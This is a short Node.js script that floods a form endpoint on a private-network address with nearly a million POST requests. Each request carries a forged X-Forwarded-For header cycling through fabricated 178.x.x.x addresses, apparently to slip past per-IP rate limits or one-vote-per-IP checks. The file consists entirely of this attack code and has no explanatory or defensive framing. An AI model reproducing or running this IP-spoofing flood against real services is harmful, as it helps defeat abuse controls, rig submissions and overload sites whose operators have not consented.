var request = require("request");

async function xd() {
    var limit = 100;
    var pending = 0;
    for (let i = 1; i < 100; i++) {
        for (let j = 1; j < 100; j++) {
            for (let k = 1; k < 100; k++) {
                if(pending < limit) {
                    let options = {
                        method: 'POST',
                        url: 'http://192.168.88.138/3gt/',
                        qs: {
                            producent: '69',
                            masa: '69',
                            model: '69',
                            submit: '69'
                        },
                        headers: {'x-forwarded-for': "178." + i + "." + j + "." + k},
                    };
                    console.log("sending from ip: " + options.headers['x-forwarded-for']);
                    request(options, function (error, response) {
                        pending--;
                        console.log("result from ip: " + options.headers['x-forwarded-for'] + ": " + (error ? error.message : response.statusCode));
                    });
                    pending++;
                }
                await new Promise(resolve => setTimeout(resolve, 10));
            }
        }
    }
}

xd();
